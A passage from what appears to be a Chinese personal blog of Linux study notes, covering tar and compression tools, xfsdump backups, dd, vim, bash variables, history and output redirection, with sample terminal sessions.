88682<br>    0 drwxr-xr-x   2 root root       81 Sep 11 09:03 .<br>    4 drwxr-xr-x. 14 root root     4096 Sep 10 10:45 ..<br>    1 -rw-r--r--   1 root root       46 Sep 11 08:43 1.txt.gz<br>88677 -rw-r--r--   1 root root 90805089 Jan 20  2018 Java语言程序设计.进阶篇.原书第10版.pdf<br></code></pre></td></tr></table></figure><p><strong>用gzip鸭缩后</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH YH]<span class="hljs-comment"># ls -alsr</span><br>total 71500<br>71495 -rw-r--r--   1 root root 73210438 Jan 20  2018 Java语言程序设计.进阶篇.原书第10版.pdf.gz<br>    1 -rw-r--r--   1 root root       46 Sep 11 08:43 1.txt.gz<br>    4 drwxr-xr-x. 14 root root     4096 Sep 10 10:45 ..<br>    0 drwxr-xr-x   2 root root       84 Sep 11 09:03 .<br></code></pre></td></tr></table></figure><p>鸭缩比19.4%</p><p><strong>用bzip2:</strong></p><blockquote><p>1.262:1,  6.338 bits&#x2F;byte, 20.78% saved, 90805089 in, 71940276 out.</p></blockquote><p><strong>用xz:</strong></p><blockquote><p> 100 %         66.3 MiB &#x2F; 86.6 MiB &#x3D; 0.766   2.2 MiB&#x2F;s       0:39 </p></blockquote><h3 id="打包命令"><a href="#打包命令" class="headerlink" title="打包命令"></a>打包命令</h3><ul><li><p>tar:</p><ul><li>-c 建立打包文件</li><li>-t 查看打包文件的内容有哪些文件名</li><li>-x 解包或解吖缩</li><li>-z 通过gzip的支持进行鸭缩或者解吖</li><li>-j 通过bzip2的支持进行鸭缩或解吖</li><li>-J 通过xz的支持进行鸭缩或解吖</li><li>-v 鸭缩与解吖过程中的文件名显示出来</li><li><strong>-f 后面要立即接要被处理的文件名</strong></li><li>-C 解吖到指定文件目录</li><li>-p 保留碑文数据的原本权限与属性</li><li>-P 保留绝对路径允许备份数据中含有根目录存在之意</li></ul></li><li><p>常用的tar命令</p><ul><li>鸭缩:tar -jcv -f filename.tar.bz2 要被鸭缩的文件或目录;</li><li>查询:tar -jtv -f filename.tar.bz2;</li><li>解吖缩:tar -jxv -f filename.tar.bz2 -C 要解压的目录</li><li>解开单一文件:<ul><li>tar -jtv -f &#x2F;root&#x2F;etc.tar.bz2 | grep ‘要解吖的文件名’ 这样可以查出来</li><li>tar -jxv -f 打包的文件.tar.bz2 待解开的文件名</li></ul></li></ul><p>注意鸭缩的时候最好自己加上.tar.[bz2|xz|gz]</p></li></ul><p>&#x3D;&#x3D;建议经常使用tar备份etc&#x3D;&#x3D;</p><p>time tar -zpcv -f etc.tar.gz &#x2F;etc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">real0m3.923s<br>user0m1.125s<br>sys0m0.097s<br></code></pre></td></tr></table></figure><p>time tar -jpcv -f etc.tar.bz2 &#x2F;etc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">real0m2.945s<br>user0m2.838s<br>sys0m0.053s<br></code></pre></td></tr></table></figure><p>time tar -Jpcv -f etc.tar.xz &#x2F;etc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">real0m12.140s<br>user0m11.764s<br>sys0m0.129s<br></code></pre></td></tr></table></figure><p>原本大小</p><blockquote><p>37MB&#x2F;etc</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">-rw-r--r--   1 root root  9453958 Sep 11 10:08 etc.tar.bz2<br>-rw-r--r--   1 root root 10732764 Sep 11 10:04 etc.tar.gz<br>-rw-r--r--   1 root root  7632840 Sep 11 10:09 etc.tar.xz<br></code></pre></td></tr></table></figure><h4 id="如果要打包目录但是不包含某些文件"><a href="#如果要打包目录但是不包含某些文件" class="headerlink" title="如果要打包目录但是不包含某些文件"></a>如果要打包目录但是不包含某些文件</h4><p>tar -jcv -f &#x2F;root&#x2F;system.tar.bz2 –exclude&#x3D;&#x2F;root&#x2F;etc*</p><p>–exclude&#x3D;不想要包含的文件</p><p>*代表通配符</p><h3 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h3><h4 id="仅备份比某个时候更新的文件"><a href="#仅备份比某个时候更新的文件" class="headerlink" title="仅备份比某个时候更新的文件"></a>仅备份比某个时候更新的文件</h4><p>–newer(包含mtime与ctime)</p><p>–newer-mtime(只能用mtime)</p><ul><li>atime:<em><strong>*显示的是文件中的数据最后被访问的时间*</strong></em></li><li>mtime:<em><strong>*显示的是文件内容被修改的最后时间*</strong></em></li><li>ctime:<em><strong>*显示的是文件的权限、拥有者、所属的组、链接数改变、文件内容改变的时间。*</strong></em></li></ul><blockquote><p>通常所说的tarfile代表只进行打包,tarbali代表打包鸭缩</p></blockquote><h4 id="关于SELinux问题"><a href="#关于SELinux问题" class="headerlink" title="关于SELinux问题"></a>关于SELinux问题</h4><p>SELinux可能会让你的系统无法读写配置文件,导致影响到系统的正常使用</p><p>如果使用上面的方法进行备份恢复但是无法正常使用可能是&#x2F;etc&#x2F;shadow这个密码文件的SELinux类在还原时被修改了导致无法正常登录</p><p>处理方法:</p><ul><li>方法一:修改&#x2F;etc&#x2F;selinux&#x2F;config文件将SELinux改成permissive模式重启;</li><li>方法二:在第一次恢复系统后不要立即重启先使用restorecon -Rv &#x2F;etc 自动修复一下SELinux即可</li><li>方法三:通过各种可行的方式登录系统,建立&#x2F;.autorelabel文件,重新启动后系统会自动修复SELinux并会再次重启后正常</li></ul><h4 id="XFS文件系统的备份与还原"><a href="#XFS文件系统的备份与还原" class="headerlink" title="XFS文件系统的备份与还原"></a>XFS文件系统的备份与还原</h4><p>xfsdump命令：增量备份,与git差不多显示出与上一份增加的文件的差异</p><p>记录文件放在&#x2F;var&#x2F;lib&#x2F;xfsdump&#x2F;inventory</p><p>注意:</p><ul><li>不支持没有挂载的文件系统备份</li><li>必须使用root</li><li>只能备份xfs</li><li>备份的数据只能用xfsrestore解析</li><li>通过UUID来识别各个备份文件</li><li>支持文件系统的备份并不支持特定目录的备份,不能备份&#x2F;etc</li></ul><p>备份测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">xfsdump -l 0 -L vda2_all -M vda2_all -f /vda2.dump /usr/local/YH<br>进行备份<br><br>xfsdump -I<br>查看结果<br><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=/usr/local/YH/test.img bs=1M count=10<br>新增文件<br><br> xfsdump -l 1 -L vda2_2 -M vda2_2 -f /vda2.dump1 /usr/local/YH<br>再次新增<br>//注意只有建立过-l 0 才能-l [1~9]进行增量备份<br><br></code></pre></td></tr></table></figure><p>使用-xfsrestore进行恢复</p><p>xfsrestore [-f 备份文件] -r 待恢复目录</p><ul><li><p>dd:</p><ul><li><p>if(input file):可以是设备</p></li><li><p>of(output file):可以是设备</p></li><li><p>bs:设置一个block的大小,默认512Bytes(一个扇区大小)</p></li><li><p>count多少个bs</p></li><li><blockquote><p>dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;usr&#x2F;local&#x2F;YH&#x2F;test.img bs&#x3D;1M count&#x3D;10<br>10+0 records in<br>10+0 records out</p><p>例如上面这个例子代表将&#x2F;dev&#x2F;zero备份到&#x2F;usr&#x2F;local&#x2F;YH&#x2F;test.img 每个分区为1M 设置10个分区 下面10+0代表10个完整的1M以及0个未满1M的意思</p></blockquote><p>使用dd复制后如果发现无法使用某些分区或者文件系统使用下面的命令</p><blockquote><p>xfs_repair -L &#x2F;dev&#x2F;sda1 #清理log</p><p>uuidgen 获得新的uuid</p><p>xfs_admin -U 新获得的UUID 设备驱动</p><p>由于dd连uuid也一起复制二xfs主要使用uuid来区分文件系统所以要在给一个uuid</p></blockquote></li></ul></li><li><p>cpio:以后再说</p></li></ul><h2 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h2><h3 id="vim的缓存与恢复"><a href="#vim的缓存与恢复" class="headerlink" title="vim的缓存与恢复"></a>vim的缓存与恢复</h3><p>当我们编辑文件时会在与编辑的目录下生成一个.filename.swp的文件,例如</p><p>vi &#x2F;YH.txt 会有.YH.text.swp 这个文件就是用来记录修改信息的</p><p>如果发生意外vim中断下次进入时按R即可恢复缓存内容但是那个缓存文件需要你自己删除否则会一直警告</p><p>如果这个缓存没用了按D进行删除vim会自己再建立一个</p><blockquote><p>注意vi与vim不一样有的时候系统默认vi就是vim使用alias命令即可查看</p><p>[root@YH vitest]# alias<br>alias cp&#x3D;’cp -i’<br>alias egrep&#x3D;’egrep –color&#x3D;auto’<br>alias fgrep&#x3D;’fgrep –color&#x3D;auto’<br>alias grep&#x3D;’grep –color&#x3D;auto’<br>alias l.&#x3D;’ls -d .* –color&#x3D;auto’<br>alias ll&#x3D;’ls -l –color&#x3D;auto’<br>alias ls&#x3D;’ls –color&#x3D;auto’<br>alias mv&#x3D;’mv -i’<br>alias rm&#x3D;’rm -i’<br>alias which&#x3D;’alias | &#x2F;usr&#x2F;bin&#x2F;which –tty-only –read-alias –show-dot –show-tilde’</p></blockquote><p>区块编辑</p><p>移动到区块最开始的位置按下ctrl+v然后移动光标会这样</p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20210912110828669.png" alt="image-20210912110828669"></p><p>按下y进行复制按p可以粘贴</p><h3 id="多文件编辑"><a href="#多文件编辑" class="headerlink" title="多文件编辑"></a>多文件编辑</h3><p>vim可以使用 vim [file1] [file2]进行同时编辑</p><p>使用:files可以显示所有要编辑的文件</p><blockquote><p>:files<br>1 %a   “man.test.conf”                line 1<br>2      “&#x2F;etc&#x2F;host”                    line 0<br>Press ENTER or type command to continue</p></blockquote><h3 id="多窗口编辑"><a href="#多窗口编辑" class="headerlink" title="多窗口编辑"></a>多窗口编辑</h3><table><thead><tr><th>命令</th><th>结果</th></tr></thead><tbody><tr><td>:sp [filename]</td><td>添加一个窗口不加filename就是创建两个窗口但是同一文件</td></tr><tr><td>ctrl+w</td><td>进行窗口的切换</td></tr><tr><td>ctrl+x</td><td>下方弹出所有的可补全提示常用的有ctrl+o以文件扩展名方式补充</td></tr><tr><td>:set nu</td><td>设置与取消行号,nonu取消行号</td></tr><tr><td>:set autoindent</td><td>设置是否自动缩进,noautoindent不缩进</td></tr><tr><td>:set all</td><td>显示目前所有的环境参数设置值</td></tr></tbody></table><p><img src="https://img2018.cnblogs.com/blog/1442837/201811/1442837-20181121151226556-202455126.png" alt="img"></p><h3 id="中文乱码问题"><a href="#中文乱码问题" class="headerlink" title="中文乱码问题"></a>中文乱码问题</h3><ul><li><p>系统默认的语言:&#x2F;etc&#x2F;locale.conf</p></li><li><p>bash的语系:LANG、LC_ALL变量有关</p></li><li><p>文件原本编码</p></li><li><p>打开终端的软件</p></li><li><p>使用iconv进行转码</p></li></ul><p>常用快捷键</p><p>w:下一个单词的词首</p><p>e:下一个单词的词尾</p><p>d:上一个单词的词首</p><p>^:行首</p><p>$:行尾</p><p>dd:删除一整行</p><p>:[行] 跳到某一行</p><h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p>查看可使用的shell</p><p>&#x2F;etc&#x2F;shells这个文件</p><p>再&#x2F;etc&#x2F;passwd这个文件中最后一个内容代表登陆后使用的shell类型</p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20210913091729821.png" alt="image-20210913091729821"></p><ul><li><p>对于shell一般能存1000条命令,对于上次登陆的命令都留在~&#x2F;.bash_history,而这一次都放在内存中</p></li><li><p>如果安装了bash-completion按tab时可以进行(选项&#x2F;参数补齐)功能</p></li><li><p>alise别名功能,举个例子 ll&#x3D;ls -l –color&#x3D;auto</p></li><li><p>使用type来查看是否为内置命令</p><ul><li>type [-tpa] name</li><li>-t 会显示一些其他属性</li><li>-p 如果接name为外部命令才会显示完整名称</li><li>-a 会由path变量定义的路径中所有含有name的命令都列出来</li></ul></li></ul><h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p>使用echo $PATH可以输出PATH变量</p><p>使用&#x3D;可以对环境变量进行改变</p><blockquote><p>[root@YH mail]# YH&#x3D;1</p><p>[root@YH mail]# echo $YH<br>1</p></blockquote><p>但是必须符合以下规则</p><ul><li><p>变量与变量内容必须用&#x3D;连接</p></li><li><p>等号两边不能有空格</p></li><li><p>变量名只能是字母或数字,但是不能是数字开头</p></li><li><p>双引号内如果有特殊字符,则会保留原意</p><ul><li><blockquote><p>[root@YH ~]# YH&#x3D;$PATH<br>[root@YH ~]# echo $YH<br>&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;root&#x2F;bin</p></blockquote></li></ul></li><li><p>单引号内如果有特殊字符则不会保留原意</p><ul><li><blockquote><p>[root@YH ~]# YH&#x3D;’$PATH’<br>[root@YH ~]# echo $YH<br>$PATH</p></blockquote></li></ul></li><li><p>使用&#96;&#96;或者$()可以在命令中使用命令</p><ul><li><blockquote><p>cd &#x2F;lib&#x2F;modules&#x2F;`uname -r`&#x2F;kernel</p><p>其中uname -r的值为</p><p>[root@YH kernel]# uname -r<br>3.10.0-1160.11.1.el7.x86_64</p></blockquote></li></ul></li><li><p>使用unset进行取消设置</p></li></ul><p>shell一般有两种登录方式而这两种登录方式读取根据文件读取的shell也不一样</p><p>我们普通的登录时用密码就称为login,而使用Xwindows登录时第一次会输入密码再然后就不用输入密码了这种成为non-login</p><p>login启动时会读取以下两个配置文件:</p><ul><li>&#x2F;etc&#x2F;profile:这是系统整体的设置</li><li><del>&#x2F;.bash_profile或</del>&#x2F;.bash_login或~&#x2F;.profile:属于用户个人设置</li></ul><h4 id="bash环境配置文件"><a href="#bash环境配置文件" class="headerlink" title="bash环境配置文件"></a>bash环境配置文件</h4><p><a href="https://blog.csdn.net/qq_36121238/article/details/103473054">https://blog.csdn.net/qq_36121238/article/details/103473054</a></p><p>太多了。。。</p><h4 id="终端的环境设置"><a href="#终端的环境设置" class="headerlink" title="终端的环境设置"></a>终端的环境设置</h4><ul><li><p>stty(set tty)</p><ul><li><p>查看所有特殊字体 ^代表[CTRL]</p></li><li><blockquote><p>speed 38400 baud; rows 31; columns 120; line &#x3D; 0;<br>intr &#x3D; ^C; quit &#x3D; ^; erase &#x3D; ^?; kill &#x3D; ^U; eof &#x3D; ^D; eol &#x3D; <undef>; eol2 &#x3D; <undef>; swtch &#x3D; <undef>; start &#x3D; ^Q;<br>stop &#x3D; ^S; susp &#x3D; ^Z; rprnt &#x3D; ^R; werase &#x3D; ^W; lnext &#x3D; ^V; flush &#x3D; ^O; min &#x3D; 1; time &#x3D; 0;<br>-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts<br>-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel -iutf8<br>opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0<br>isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke</undef></undef></undef></p><p>intr:发送中断的信号给目前正在run的程序</p><p>quit:发送一个quit给正在run的程序</p><p>erase:向后删除字符</p><p>kill:删除在目前命令行上的所有文字</p><p>eof:end of file 代表[输入结束]</p><p>start:在某个程序停止后重新启动他的output</p><p>stop:停止目前屏幕的输出</p><p>susp:送一个terminal stop 的信号给正在运行的程序</p></blockquote></li></ul></li><li><p>set(可以设置以下额外的终端环境但是书上不建议修改)</p><ul><li><a href="https://www.runoob.com/linux/linux-comm-set.html">https://www.runoob.com/linux/linux-comm-set.html</a></li></ul></li></ul><h3 id="查看环境变量"><a href="#查看环境变量" class="headerlink" title="查看环境变量"></a>查看环境变量</h3><ul><li><p>使用env命令</p><ul><li><blockquote><p>XDG_SESSION_ID&#x3D;5449               &lt;===主机名<br>HOSTNAME&#x3D;YH<br>TERM&#x3D;xterm                &lt;===使用的终端环境类型<br>SHELL&#x3D;&#x2F;bin&#x2F;bash                 &lt;===使用的bash类型<br>HISTSIZE&#x3D;3000                        &lt;===记录的命令个数<br>SSH_CLIENT&#x3D;144.12.230.5 48025 22<br>OLDPWD&#x3D;&#x2F;usr&#x2F;local&#x2F;YH                &lt;===上一个工作目录<br>SSH_TTY&#x3D;&#x2F;dev&#x2F;pts&#x2F;6<br>USER&#x3D;root                          &lt;===使用者名称<br>LS_COLORS&#x3D;rs&#x3D;0:di&#x3D;01;34:ln&#x3D;01;36:mh&#x3D;00:pi&#x3D;40;33:so&#x3D;01;35:do&#x3D;01;35:bd&#x3D;40;33;01:cd&#x3D;40;33;01:or&#x3D;40;31;01:mi&#x3D;01;05;37;41:su&#x3D;37;41:sg&#x3D;30;43:ca&#x3D;30;41:tw&#x3D;30;42:ow&#x3D;34;42:st&#x3D;37;44:ex&#x3D;01;32:<em>.tar&#x3D;01;31:</em>.tgz&#x3D;01;31:<em>.arc&#x3D;01;31:</em>.arj&#x3D;01;31:<em>.taz&#x3D;01;31:</em>.lha&#x3D;01;31:<em>.lz4&#x3D;01;31:</em>.lzh&#x3D;01;31:<em>.lzma&#x3D;01;31:</em>.tlz&#x3D;01;31:<em>.txz&#x3D;01;31:</em>.tzo&#x3D;01;31:<em>.t7z&#x3D;01;31:</em>.zip&#x3D;01;31:<em>.z&#x3D;01;31:</em>.Z&#x3D;01;31:<em>.dz&#x3D;01;31:</em>.gz&#x3D;01;31:<em>.lrz&#x3D;01;31:</em>.lz&#x3D;01;31:<em>.lzo&#x3D;01;31:</em>.xz&#x3D;01;31:<em>.bz2&#x3D;01;31:</em>.bz&#x3D;01;31:<em>.tbz&#x3D;01;31:</em>.tbz2&#x3D;01;31:<em>.tz&#x3D;01;31:</em>.deb&#x3D;01;31:<em>.rpm&#x3D;01;31:</em>.jar&#x3D;01;31:<em>.war&#x3D;01;31:</em>.ear&#x3D;01;31:<em>.sar&#x3D;01;31:</em>.rar&#x3D;01;31:<em>.alz&#x3D;01;31:</em>.ace&#x3D;01;31:<em>.zoo&#x3D;01;31:</em>.cpio&#x3D;01;31:<em>.7z&#x3D;01;31:</em>.rz&#x3D;01;31:<em>.cab&#x3D;01;31:</em>.jpg&#x3D;01;35:<em>.jpeg&#x3D;01;35:</em>.gif&#x3D;01;35:<em>.bmp&#x3D;01;35:</em>.pbm&#x3D;01;35:<em>.pgm&#x3D;01;35:</em>.ppm&#x3D;01;35:<em>.tga&#x3D;01;35:</em>.xbm&#x3D;01;35:<em>.xpm&#x3D;01;35:</em>.tif&#x3D;01;35:<em>.tiff&#x3D;01;35:</em>.png&#x3D;01;35:<em>.svg&#x3D;01;35:</em>.svgz&#x3D;01;35:<em>.mng&#x3D;01;35:</em>.pcx&#x3D;01;35:<em>.mov&#x3D;01;35:</em>.mpg&#x3D;01;35:<em>.mpeg&#x3D;01;35:</em>.m2v&#x3D;01;35:<em>.mkv&#x3D;01;35:</em>.webm&#x3D;01;35:<em>.ogm&#x3D;01;35:</em>.mp4&#x3D;01;35:<em>.m4v&#x3D;01;35:</em>.mp4v&#x3D;01;35:<em>.vob&#x3D;01;35:</em>.qt&#x3D;01;35:<em>.nuv&#x3D;01;35:</em>.wmv&#x3D;01;35:<em>.asf&#x3D;01;35:</em>.rm&#x3D;01;35:<em>.rmvb&#x3D;01;35:</em>.flc&#x3D;01;35:<em>.avi&#x3D;01;35:</em>.fli&#x3D;01;35:<em>.flv&#x3D;01;35:</em>.gl&#x3D;01;35:<em>.dl&#x3D;01;35:</em>.xcf&#x3D;01;35:<em>.xwd&#x3D;01;35:</em>.yuv&#x3D;01;35:<em>.cgm&#x3D;01;35:</em>.emf&#x3D;01;35:<em>.axv&#x3D;01;35:</em>.anx&#x3D;01;35:<em>.ogv&#x3D;01;35:</em>.ogx&#x3D;01;35:<em>.aac&#x3D;01;36:</em>.au&#x3D;01;36:<em>.flac&#x3D;01;36:</em>.mid&#x3D;01;36:<em>.midi&#x3D;01;36:</em>.mka&#x3D;01;36:<em>.mp3&#x3D;01;36:</em>.mpc&#x3D;01;36:<em>.ogg&#x3D;01;36:</em>.ra&#x3D;01;36:<em>.wav&#x3D;01;36:</em>.axa&#x3D;01;36:<em>.oga&#x3D;01;36:</em>.spx&#x3D;01;36:<em>.xspf&#x3D;01;36:<br>MAIL&#x3D;&#x2F;var&#x2F;spool&#x2F;mail&#x2F;root                        &lt;===mailbox的位置<br>PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;root&#x2F;bin<br>PWD&#x3D;&#x2F;usr&#x2F;local<br>LANG&#x3D;en_US.utf8                &lt;===语言<br>SHLVL&#x3D;1<br>HOME&#x3D;&#x2F;root                   &lt;===用户目录<br>LOGNAME&#x3D;root<br>SSH_CONNECTION&#x3D;144.12.230.5 48025 172.17.0.5 22<br>LESSOPEN&#x3D;||&#x2F;usr&#x2F;bin&#x2F;lesspipe.sh %s<br>PROMPT_COMMAND&#x3D;history -a; history -a; printf “\033]0;%s@%s:%s\007” “${USER}” “${HOSTNAME%%.</em>}” “${PWD&#x2F;#$HOME&#x2F;~}”<br>XDG_RUNTIME_DIR&#x3D;&#x2F;run&#x2F;user&#x2F;0<br>HISTTIMEFORMAT&#x3D;%F %T<br>_&#x3D;&#x2F;usr&#x2F;bin&#x2F;env</p></blockquote></li></ul></li><li><p>使用set观察(包含环境变量与自定义变量)</p><ul><li>其中PS1这个变量用于改变[11:08:32 root@YH YH]# </li><li>很多就不细讲了</li></ul></li><li><p>$?上一个命令的返回值一般正常返回0</p></li><li><p>$$查看bash的pid</p></li><li><p>OSTYPE、HOSTTYPE、MACHTYPE</p></li><li><p>export将自定义变量转换为环境变量，子进程可以使用父进程的环境变量但是无法使用自定义变量</p><ul><li>export [变量名称]如果不写变量名称会把所有环境变量都列出来</li></ul></li><li><p>使用locale可以显示出所有支持的语系</p></li></ul><h3 id="设置变量"><a href="#设置变量" class="headerlink" title="设置变量"></a>设置变量</h3><ul><li><p>使用read可以交互式设置变量</p><ul><li>read [-p提示字符t等待秒数] variable将数据读取到variable变量中</li></ul></li><li><p>declare,typeset:声明变量类型,如果declare后面没有任何参数直接显示出所有的变量名与内容与set差不多,</p><ul><li>declare [-a数组-i整形-x与export一样-r设为readonly]</li></ul></li></ul><blockquote><p>设置永久变量<a href="https://blog.csdn.net/u010794523/article/details/38622275/">https://blog.csdn.net/u010794523/article/details/38622275/</a></p></blockquote><h3 id="使用ulimit"><a href="#使用ulimit" class="headerlink" title="使用ulimit"></a>使用ulimit</h3><p>由于Linux可以多个用户同时登录使用所有要为每个用户设置资源占比</p><ul><li><p>ulimit</p><ul><li>-a 　显示目前资源限制的设定。</li><li>-c &lt;core文件上限&gt; 　设定core文件的最大值，单位为区块。</li><li>-d &lt;数据节区大小&gt; 　程序数据节区的最大值，单位为KB。</li><li>-f &lt;文件大小&gt; 　shell所能建立的最大文件，单位为区块。</li><li>-H 　设定资源的硬性限制，也就是管理员所设下的限制。</li><li>-m &lt;内存大小&gt; 　指定可使用内存的上限，单位为KB。</li><li>-n &lt;文件数目&gt; 　指定同一时间最多可开启的文件数。</li><li>-p &lt;缓冲区大小&gt; 　指定管道缓冲区的大小，单位512字节。</li><li>-s &lt;堆叠大小&gt; 　指定堆叠的上限，单位为KB。</li><li>-S 　设定资源的弹性限制。(警告)</li><li>-t &lt;CPU时间&gt; 　指定CPU使用时间的上限，单位为秒。</li><li>-u &lt;程序数目&gt; 　用户最多可开启的程序数目。</li><li>-v &lt;虚拟内存大小&gt; 　指定可使用的虚拟内存上限，单位为KB。</li></ul></li></ul><h3 id="删除变量中的内容"><a href="#删除变量中的内容" class="headerlink" title="删除变量中的内容"></a>删除变量中的内容</h3><p>#从前面删除[最小匹配]  ${变量#关键字}</p><p>##从前面删除[最大匹配]  ${变量##关键字}</p><p>%从后面删除[最小匹配]  ${变量%关键字}</p><p>%%从后面删除[最大匹配]  ${变量%%关键字}</p><p>&#x2F;替换符合字符串的第一个内容  ${变量&#x2F;旧字符串&#x2F;新字符串}</p><p>&#x2F;&#x2F;替换符合字符串的所有字符串  ${变量&#x2F;&#x2F;旧字符串&#x2F;新字符串}</p><h3 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h3><p>alise </p><p>命名规则与变量命名规则几乎一样</p><p>alise 别名&#x3D;’命令 选项’</p><h3 id="history"><a href="#history" class="headerlink" title="history"></a>history</h3><p>查看历史命令的命令</p><ul><li>n:最近n条命令</li><li>-c:清除目前的shell中所有history内容</li><li>-a:将目前新增的history写入到histfiles中默认写入~&#x2F;.bash_history</li><li>-r:将目前的history记录内容读到shell的histfiles中</li><li>-w:将目前history内容写入histfiles中</li></ul><p>使用!命令</p><ul><li>!!执行上一条命令</li><li>!n执行第n条命令</li><li>!vi执行近来vi开头的命令</li></ul><h3 id="命令执行顺序"><a href="#命令执行顺序" class="headerlink" title="命令执行顺序"></a>命令执行顺序</h3><ul><li>包含绝对或者相对路径的命令</li><li>由alias命令执行</li><li>由bash内置的命令执行</li><li>通过$PATH变量来找到第一个命令执行</li></ul><h4 id="bash的欢迎信息"><a href="#bash的欢迎信息" class="headerlink" title="bash的欢迎信息"></a>bash的欢迎信息</h4><p>&#x2F;etc&#x2F;issue</p><p>&#x2F;etc&#x2F;motd</p><h2 id="通配符与特殊符号"><a href="#通配符与特殊符号" class="headerlink" title="通配符与特殊符号"></a>通配符与特殊符号</h2><table><thead><tr><th>符号</th><th>意义</th></tr></thead><tbody><tr><td>*</td><td>任意多个字符</td></tr><tr><td>?</td><td>任意一个字符</td></tr><tr><td>[abc]</td><td>abc中的一个</td></tr><tr><td>[-]</td><td>如果[]中有-代表从哪到哪例如[1-9]标识从1-9中任意一个</td></tr><tr><td>[^]</td><td>不含有的意思例如[^abc]里面只要没有abc就满足</td></tr></tbody></table><p>特殊符号</p><table><thead><tr><th>#</th><th>注释</th></tr></thead><tbody><tr><td>\</td><td>转义符</td></tr><tr><td>|</td><td>管道</td></tr><tr><td>;</td><td>连续命令执行分隔符</td></tr><tr><td>~</td><td>家</td></tr><tr><td>$</td><td>变量前导符</td></tr><tr><td>&amp;</td><td>任务管理:将命令变成后台任务</td></tr><tr><td>!</td><td>not的意思</td></tr><tr><td>&#x2F;</td><td>目录符号</td></tr><tr><td>&gt;，&gt;&gt;</td><td>输出流重定向分别时替换和累加</td></tr><tr><td>&lt;,&lt;&lt;</td><td>输入流重定向</td></tr><tr><td>‘’</td><td>不具有变量替换功能</td></tr><tr><td>“”</td><td>具有变量替换功能</td></tr><tr><td>&#96;&#96;</td><td>可以执行的命令或使用$()例如在””想要执行命令”&#96;&#96;”</td></tr><tr><td>()</td><td>为子shell的开始与结束</td></tr><tr><td>{}</td><td>命令区块的组合</td></tr></tbody></table><h2 id="数据流重定向"><a href="#数据流重定向" class="headerlink" title="数据流重定向"></a>数据流重定向</h2><p>重定向数据表示</p><p>0&#x3D;keyboard 键盘输入,并返回在前端 </p><p>1&#x3D;monitor 正确返回值 输出到前端 </p><p>2&#x3D; monitor 错误返回值 输出到前端</p><p>echo $? 输出上一个的状态码,不是0就是错误</p><ul><li><p>&gt;:标准输出流到指定位置并进行覆盖</p><ul><li><blockquote><p>一般来说, “1&gt;” 通常可以省略成 “&gt;”.</p></blockquote></li></ul></li><li><p>&gt;&gt;:标准输出流到指定位置并进行叠加</p></li><li><p>&lt;:标准输入流,将命令所需的字符串通过流进行输入</p></li><li><p>&lt;&lt;:标准输入流,将命令所需的字符串通过键盘输入并设置结束标志</p><ul><li><img src="/.com//....%5Cpublic%5Cimg%5Clinux.png" alt="111"></li></ul></li><li><p>2&gt;:标准错误流到指定位置并进行覆盖</p></li><li><p>2&gt;&gt;:标准错误流到指定位置并进行叠加</p></li></ul><blockquote><p>如果错误流和正确流都要写入一个文件可以使用2&gt;&amp;1 或者 &amp;&gt;</p><p>[root@YH YH]# find &#x2F;home -name .bashrc &amp;&gt; $WORK&#x2F;error<br>[root@YH YH]# cat error<br>&#x2F;home&#x2F;stranger&#x2F;.bashrc<br>[root@YH YH]# find &#x2F;home -name .bashrc &gt; $WORK&#x2F;error 2&gt;&amp;1<br>[root@YH YH]# cat error<br>&#x2F;home&#x2F;stranger&#x2F;.bashrc<br>[root@YH YH]# find &#x2F;home -name .bashc &gt; $WORK&#x2F;error 2&gt;&amp;1<br>[root@YH YH]# cat error<br>[root@YH YH]# find &#x2F;home -name .b* &gt; $WORK&#x2F;error 2&gt;&amp;1<br>[root@YH YH]# cat error<br>&#x2F;home&#x2F;stranger&#x2F;.bashrc<br>&#x2F;home&#x2F;stranger&#x2F;.bash_logout<br>&#x2F;home&#x2F;stranger&#x2F;.bash_profile<br>[root@YH YH]# find &#x2F;home -nam .b* &gt; $WORK&#x2F;error 